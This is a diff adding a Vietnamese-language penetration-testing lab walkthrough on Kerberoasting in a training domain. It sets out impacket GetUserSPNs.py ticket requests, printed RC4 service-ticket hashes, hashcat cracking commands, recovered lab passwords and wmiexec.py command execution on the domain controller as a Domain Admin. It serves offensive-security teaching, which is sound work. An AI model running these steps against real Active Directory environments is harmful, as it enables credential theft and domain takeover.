@@ -5912,3 +5912,196 @@ y
 
 Chúng tôi chỉ cần chạy đoạn mã mình chọn bằng cách sử dụng tệp nhị phân đã được Microsoft ký. Luôn có những kỹ thuật mới để làm điều này. Không giống như các phương pháp vượt qua phần mềm diệt virus/EDR, các phương pháp vượt qua kiểm soát ứng dụng có thời gian tồn tại lâu hơn nhiều.
 
+# Lab 5.1. Kerberoast
+
+## Mục tiêu
+
+- Chúng tôi sẽ lấy phiếu yêu cầu dịch vụ RC4 (TGS) cho tài khoản dịch vụ bằng cách sử dụng SPN.
+
+- Chúng ta sẽ bẻ khóa phiếu yêu cầu dịch vụ RC4 bằng Hashcat.
+
+- Chúng tôi sẽ sử dụng thông tin xác thực mới được xác định để chuyển sang DC01 (10.130.10.4)
+
+## Thiết lập phòng thí nghiệm
+
+Các máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Slingshot Linux:
+
+![alt text](IMG/LAB5/LAB5.1/imagE.png)
+
+Trong trường hợp bạn đã chạy bài thực hành này trước đây, hãy cùng nhau dọn dẹp một chút. Chúng ta hãy xóa các tệp pot của JtR và Hashcat.
+
+```bash
+rm /home/sec560/.local/share/hashcat/hashcat.potfile
+rm ~/.john/john.pot
+```
+
+## Hướng dẫn thực hành từng bước
+
+Chúng ta đã có được một bộ thông tin đăng nhập miền hợp lệ (không có đặc quyền). Từ đây, mục tiêu của chúng ta là tiếp tục nâng cao đặc quyền trong miền bằng cách xâm nhập vào một tài khoản dịch vụ.
+
+### 1. Liệt kê và yêu cầu vé
+
+Chú ý, chúng ta cần cấu hình DNS:
+
+![alt text](IMG/LAB5/LAB5.1/imagE-2.png)
+
+Bước đầu tiên, chúng ta sẽ sử dụng tập lệnh Python GetUserSPNs.py, tập lệnh này sẽ thực hiện các bước sau:
+
+- Liệt kê người dùng bằng Tên Chính của Dịch vụ (SPN). Xin nhắc lại, các tài khoản dịch vụ đã được cấu hình SPN!
+- Yêu cầu phiếu yêu cầu dịch vụ cho các tài khoản dịch vụ này
+
+Cuộc tấn công này yêu cầu quyền truy cập với tư cách bất kỳ người dùng nào. 
+
+Chúng ta sẽ sử dụng h`iboxy\bgreen` mật khẩu `Password1` mà chúng ta tìm thấy trong 560.2.
+
+Chúng ta sẽ sử dụng `GetUserSPNs.py` thư viện impacket. Chúng ta cần cung cấp một vài tùy chọn:
+
+- Thông tin đăng nhập - Chúng ta có thể cung cấp tên miền, tên người dùng và mật khẩu như sau: `hiboxy/bgreen:Password1`.
+
+- `-request` - Yêu cầu công cụ tạo yêu cầu vé sau khi nó xác định được các vé đó.
+- `-dc-ip` - Địa chỉ IP của trung tâm dữ liệu mà chúng ta đang yêu cầu vé.
+
+```bash
+GetUserSPNs.py hiboxy.com/bgreen:Password1 -request -dc-ip 10.130.10.10 | tee /tmp/spns.output
+```
+
+![alt text](IMG/LAB5/LAB5.1/imagE-1.png)
+
+```bash
+$krb5tgs$23$*SVC_SQLService2$HIBOXY.COM$hiboxy.com/SVC_SQLService2*$c0c7991bffbefc7f00fe182aa426c0b4$81a097ceb9104845d89e32fda6cfd1f2254cac6ee7f6c7db0e998d39448f143fa8ac0f626addeec662eb91782ab35e2de6c4f8b47072981aa5957fda860aa2c988d18b5affc0db35de09b32de1930c0ebf50316ed33cac7b2725b54753fcd4b43b18c6cef272d0b416aa16af3ce03719346b5edfdfbda48291868d61040e0ea27d93fc8738edd09d31d48ca37b6132c4f2c417d9278af3e8823c16836468881ac4f7d3a442ffdd8ecea5e86014d3a97b2cac7ab87e82328e16c45b1e9b99c1e7c407f1c808faf2394e40de4aceb3a426ecec46e357c92e6200f8f220091db36697de0959c12ef443ace8e9edfc5d3b04f301be03c84f69bcfc1ab1171dffc29711789de3e3115e99cc817e705d5df90abb167e64f8da9443b2e51b3bce5522da0c74b89133c5379792ca77938817369b454a4c8ad5fe07738257764f1a312989b8428107058f50171d279b59281e2755b09924ca5b1921a794fd1e876f20516de565ef371fbba6771d6b60e1e1c062a11f945c0835538ce4f034ff34334ceda6da9470a260a16162f31fcad03dc98203bed9309995932e92405aaa6e540de6ac11f89688e63d8e6fa59b0ea5ccc840e7c5b127b36d3ba638a1802e9976b57ed2ea8c741e4d5323cb2dba12009c302ce6a8f087fd295bb8c182101af22d448faff511031a5672c1db2b68d560575f6778192a54d0984e22f654bbde50ce3b6e0d4caf038bf2a07303691a756de95751f1e5a0059293a87000028d791fe7d4fc65ec03c9fd8153a608e86d55422d80bdf109900900830e2e334d6717e219c3195ff27e9a74b29f1f2390d086593e87e07cf8003b272e36bd39447e9b6fc1b796abd0407f187a17e9f1a43b2981e70699a0f83628b075fb7d101b399b047022f147effd87ecf883988660fe484981323c498a28f85247a5b51a79048619c451bd5bbbe0dda9cbc298f7ec8c252540070ecd89fc6a3fc1491adcf6d1c411df4c96fcb7fae44356ade9904ce34fcccd90324cf1ce6a3039c2ea7c91c235f596a4d43e771d8e24a58141a82838a43c2778871563c4fae6e7d78a73c06e319599c44a9c0cfff0e728510c0b6d2d42b342581e9f2306c39a8975f05c7059639f8e22764a6882d364e412262f7d5db8473673756a007b8e092b4c705e5ea985788368ea17eb67e6c1d22753b08b4c137bb99a206324ceebef64028cf912b36c7fc33de69a67c504401496ec1441a5685afd714dfa4ce0fd108f37672b504e36ce362e5e2bf3ec3e745ec05f17f991339e87a94f88c1cb3f17fa9b68c8029745e8d36fd4c4c3ab8bb873f101f25a379a747344296fda03d227fc67e46bd37eb107f5ee685cbea1fcbb6ba725f11e9b3459ac00ab71a1778cb5a4963a0dd6a68e3f3fa92d237557f8fb607c6cc9f8f2a9704ef7d7e5bb2786f947aa75ac3097b0d3c12d5d39b5c56ed30dce7296be
+$krb5tgs$23$*SVC_SQLService$HIBOXY.COM$hiboxy.com/SVC_SQLService*$9c3dc97064507a130ca1494a4793a60a$a5bc4c0e30f5ef979c0a87d453a8de9bd3d6e6c76ccedfa6e63b1be36e11b6b86cd26a85da1861c0b7f820627c9322b6f261c90361d37a56496cee557d585bcc8bf0653c3057aeacd843ee67f55ac3e7977150d48308465b7437ca5ca57f6c0b20a608fca2c8fb96c67c6f2c4fbdb0e1111a5967fa37f73cb79fe204d10dac3589ac0b3b5552d198002aefd7acab6b15667c3a46e30d0b47db881d56cae2d2f091568d68084d138e03d0a29f0573c51f3ca6c715abe98aa4359fe67898fbcd9db2cedf3138025387d37eac7a63a8bcfc31284b84a678610d895a5b1fb17ebce69abe518194e2608b29ac328e2eb4920337a792b97c79509ceed4793634fb73c5fd0d2e8f35dd83fab9f202ba8c880a697075a3f4b08298f34d1344a00a6ff6a06f7b5d0b619eae28a06512b31ef1f8140d6881669375c98be30cae79f7897bf9afbe0ead181c75dd7602da54e157aba689289fa681007fff6be63d0baefccc307a4ab445a9d54a79744ea91d7993770efc017dc21c6d64245796786392122aa9f139f599cd404de0a0cca0984367babdba7f379fba601eca1783f6cdf96d194be9e392b572f4dab26b3d8e8ea7ffec83d4ecb11b0b30a7096f37a70e581a680b7918c2f061dfa7d8334b6aa7a96e8fef8fdae41a2d46afca8eda7fff8244c8f70be2dc5ca4214f3ed97188b3d977a4336d4ad3a558d336cbb8f730b886d4901038618a71e352c6a3646a3ae4a5c09d5e9b86e126da53ef54c6b310c73972b3fe54560aebf7a67dc94ef595dcaf1a1e84f4b4d5272d497f6451b21c9f47c5a5434f707e1e1f289e50e9cfb0ae78ab2f5483cb327c459e5b532b9b3ec7e6219132b68d4fa560ca368da6c9d6ef63c568d2d8cd240806c31113a3512782c20b9c199e33b0fb4c5d0bb8de76b519f0177e6435e7128521e99d0131a586e39a4e82b1e21c96ead9aa083d77f825f23a36dd58a6425684222d07b58e8ec24d2917d634fd26ced5e01b0cc0e5d4d7faec78633fc6a69468f56e505b0e5fe3b1b1c7246ceda524484db780962216c07c82c1a7910a31eacaa0a9d83064a934dd62c94aa83f31f798ee05f2dada1cb7a8f515b1b21db84d5afc7096e3f201edc36c4d14bbc9cc1914fd21c0d73c53293ddf5f46cd35942d005f77c912d932f61f50154bd47aefd6569e83d31d57e9f00cfe93496cd20025083550bbfc54cdded53c4beefbf88178b7a5934f08be49cc9737809df44b636a9706159ac672f770c9fff73bd16b5ae35c114fab6c68eb52a09af3ff6d03460e7407db126aed274164a3e6c6d9941b20c77f0bdb7b8d531856bec367d8a5d66a0141d40d775dbeb7a22a8bfb8e911af365648dd543e30dc18788bd0af3e69a458968e86c4386c15358ce9da1d3b0672c18307b847ae16a2037b4295163c5e3536fa769868f3199602ae5e6665e690a2d03b3002284c2
+```
+
+Trong kết quả của lệnh, bạn sẽ thấy hai tài khoản dịch vụ `SVC_SQLService` và `SVC_SQLService2`. Bạn cũng sẽ thấy thông tin về các quyền mà tài khoản đó có trong miền. Có vẻ như tài khoản dịch vụ này thuộc `Domain Admins` nhóm , tuyệt vời!
+
+Ngoài ra, `tee` lệnh này hiển thị kết quả được truyền xuống từ lệnh trước đó và lưu kết quả vào một tệp.
+
+Cuối cùng, bạn cũng sẽ thấy một chuỗi dài bắt đầu bằng `$krb5tgs$23$`. Đây là phiếu dịch vụ được mã hóa bằng RC4 (số 23 biểu thị loại mã hóa RC4) mà chúng ta có thể thử tấn công vét cạn!
+
+Cần lưu ý rằng trong môi trường doanh nghiệp lớn, bạn có thể thấy hàng trăm hoặc hàng nghìn tài khoản dịch vụ. Trong quá trình thực hiện nhiệm vụ, người ta sẽ yêu cầu tạo phiếu hỗ trợ cho một số lượng lớn các tài khoản này, với hy vọng có thể giải quyết được ít nhất một trong số chúng.
+
+Trên thực tế có rất nhiều tài khoản dịch vụ khác trong môi trường này, nhưng công cụ chỉ tìm kiếm những dịch vụ có SPN được liên kết với tài khoản người dùng, vì SPN có thể bị bẻ khóa. Mã băm mật khẩu tài khoản máy tính được tạo ngẫu nhiên và về cơ bản là không thể bẻ khóa được.
+
+Cần lưu ý rằng có nhiều cách để trích xuất thông tin tài khoản dịch vụ từ miền; `Impacket GetUserSPN's` chỉ là một trong số đó. Một ví dụ điển hình khác là `Invoke-Kerberoast` lệnh trong `Powerview` bộ công cụ. Một số công cụ này cũng có thể bao gồm tài `krbtgt` khoản đó như một tài khoản dịch vụ. Mặc dù về mặt kỹ thuật điều này là đúng, nhưng đó không phải là tài khoản dễ bị tấn công Kerberoasting. Mật khẩu `krbtgt` tài khoản được hệ thống tạo ra (sử dụng mật khẩu dài và có tính ngẫu nhiên cao), điều này khiến nó gần như miễn nhiễm với các cuộc tấn công vét cạn.
+
+### 2. Mở khóa tấm vé
+
+Bước tiếp theo, chúng ta sẽ thử khôi phục mật khẩu cho hai tài khoản bằng cách tấn công vét cạn (brute force) vào mã số dịch vụ mà chúng ta đã có được. Chúng ta sẽ sử dụng Hashcat làm công cụ phù hợp cho việc này!
+
+Chúng ta đã từng sử dụng Hashcat trong khóa học trước đây, và chắc hẳn bạn còn nhớ nó yêu cầu các thông số đầu vào sau:
+
+- Tệp từ điển.
+
+- Một hàm băm cần giải mã.
+
+- Loại băm (chế độ).
+
+- Loại tấn công bạn muốn thực hiện (tấn công vét cạn, tấn công danh sách từ, tấn công mặt nạ,...).
+
+Lệnh `tee` trên đã lưu toàn bộ đầu ra, nhưng chúng ta chỉ muốn những dòng có thể bẻ khóa. Hãy trích xuất chúng từ tệp gốc. Nhớ lại rằng đầu ra chứa thông tin `$krb5tgs$23$` ở phần đầu. Chúng ta có thể sử dụng grep với một phần văn bản này để lưu các mã băm vào một tệp sẵn sàng cho việc bẻ khóa.
+
+```bash
+grep krb5tgs /tmp/spns.output > /tmp/tickets
+```
+
+Khi xem lại tài liệu của hashcat, bạn sẽ thấy rằng `$krb5tgs$23$` kết quả mà chúng ta thu được trước đó được tham chiếu trong hashcat với tên gọi là mode `13100`.
+
+Chúng ta hãy sử dụng các từ trong từ điển tiếng Anh và thêm một số vào cuối (để tiết kiệm thời gian).
+
+```bash
+hashcat -m 13100 -a 6 /tmp/tickets /opt/passwords/english-dictionary-capitalized.txt ?d
+```
+
+![alt text](IMG/LAB5/LAB5.1/imagE-3.png)
+
+Quá trình này sẽ chạy trong khoảng một phút, sau đó sẽ hiển thị mật khẩu của `Supercool7`.
+
+### 3. Giải mã vé quản trị tên miền
+
+Chúng ta đã mở được một tấm vé rồi. Giờ hãy mở tấm vé thứ hai.
+
+Lần này chúng ta sẽ thêm vào trước (`-a 7`) một ký tự đặc biệt (`?s`). Chúng ta cũng cần thay đổi thứ tự của mặt nạ và từ điển.
+
+```bash
+hashcat -m 13100 -a 7 /tmp/tickets ?s /opt/passwords/english-dictionary-capitalized.txt
+```
+
+Chúng tôi đã tìm thấy mật khẩu cho `SVC_SQLService2` tài khoản đó, và như bạn đã nhớ ở trên, đó là tài khoản của thành viên nhóm Quản trị viên tên miền!
+
+![alt text](IMG/LAB5/LAB5.1/imagE-4.png)
+
+### 4. Sử dụng thông tin đăng nhập bị đánh cắp
+
+Bước cuối cùng, chúng ta sẽ sử dụng thông tin đăng nhập vừa lấy được để truy cập vào bộ điều khiển miền (DC01 - 10.130.10.10).
+
+Vì chúng ta muốn bắt đầu từ trạng thái sạch sẽ, vui lòng đóng cửa sổ lệnh hashcat hoặc gõ lệnh clearđể có một cửa sổ terminal trống:
+
+```bash
+clear
+```
+
+Chúng tôi sẽ sử `wmiexec.py` dụng tài khoản vừa bị xâm nhập để thực thi các lệnh trên DC01 `SVC_SQLService2`.
+
+Hãy nhớ lại cú pháp của lệnh này là:
+
+```bash
+wmiexec.py username : password @ target command
+```
+
+- `Username`: Tên người dùng có định dạng domain/username, trong trường hợp của chúng ta, tên miền là hiboxy.comvà tên người dùng là SVC_SQLService2, vì vậy tên người dùng đầy đủ là hiboxy.com/SVC_SQLService2.
+
+- `Password`.
+
+- `Target`: Đây là hệ thống mục tiêu, trong trường hợp này là địa chỉ IP của bộ điều khiển miền 10.130.10.10.
+
+- `Command`: Đây là lệnh cần chạy, chúng ta sẽ sử dụng `whoami` lệnh đầu tiên.
+
+Chạy tập `wmiexec.py` lệnh bằng `whoami` lệnh:
+
+```bash
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 whoami
+```
+
+![alt text](IMG/LAB5/LAB5.1/imagE-5.png)
+
+Tiếp theo, chúng ta có thể xác nhận mình đang ở trên Bộ điều khiển miền với tư cách là `svcsqlserver` tài khoản bằng cách sử dụng `hostname` lệnh. Chỉ cần nhấn phím mũi tên lên và thay thế `whoami` bằng `hostname`.
+
+```bash
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 hostname
+```
+
+![alt text](IMG/LAB5/LAB5.1/imagE-6.png)
+
+Bây giờ chúng ta hãy chạy net `user` lệnh. Thay vì gõ lại lệnh trước đó, hãy nhấn phím mũi tên lên để quay lại lệnh trước đó, sau đó dùng phím xóa (hoặc `Ctrl+W` để xóa cả một từ) để xóa `hostname` và gõ lại `net user`.
+
+Chạy lệnh `wmiexec.py` này `net user` để lấy danh sách người dùng miền:
+
+```bash
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 net user
+```
+
+![alt text](IMG/LAB5/LAB5.1/imagE-7.png)
+
+Cuối cùng, chúng ta có thể chạy net `user` lệnh để xem nó `svcsqlserver` là thành viên của những nhóm nào:
+
+```bash
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 net user SVC_SQLService2
+```
+
+![alt text](IMG/LAB5/LAB5.1/imagE-8.png)
+
+Một trong những nhóm đó là nhóm "Quản trị viên tên miền"!
+
+Chúc mừng! Bạn đã đột nhập thành công vào tài khoản dịch vụ có quyền quản trị tên miền!
+
+Cần lưu ý rằng một số công cụ khác cũng có thể được sử dụng để thiết lập quyền thực thi lệnh bằng tài khoản bị xâm phạm. Một ứng cử viên hàng đầu khác là psexec.py (cũng là một phần của bộ công cụ impacket) hoặc psexec.exe, một tệp nhị phân được Microsoft ký số có thể được sử dụng để thiết lập phiên tương tác trên các máy tính Windows.
+
+## Phần kết luận
+
+Tóm lại, trong thí nghiệm này, chúng tôi đã xác định được một tài khoản dịch vụ được cấu hình với mật khẩu yếu. Chúng tôi đã yêu cầu một vé dịch vụ được mã hóa RC4, cho phép chúng tôi thực hiện tấn công vét cạn bằng hashcat. Cuối cùng, chúng tôi đã sử dụng tài khoản bị xâm phạm để giành quyền quản trị viên cấp độ miền trong môi trường.
+
+Tấn công Kerberoasting là một kỹ thuật tấn công cực kỳ hiệu quả, không dựa vào việc thiếu bản vá lỗi hoặc cấu hình sai và do đó có thể tạo ra "lối vào" trong các môi trường được bảo mật tương đối tốt!
